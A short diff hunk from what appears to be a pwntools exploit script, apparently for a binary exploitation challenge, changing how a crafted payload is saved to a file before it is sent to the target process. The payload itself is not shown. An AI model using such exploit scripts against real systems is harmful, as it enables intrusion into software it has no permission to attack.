@@ -31,8 +31,7 @@ payload = flat({
 )
 
 # Save payload to file
-f = open("payload", "wb")
-f.write(payload)
+write("payload", payload)
 
 # PWN
 p.sendlineafter('>', payload)
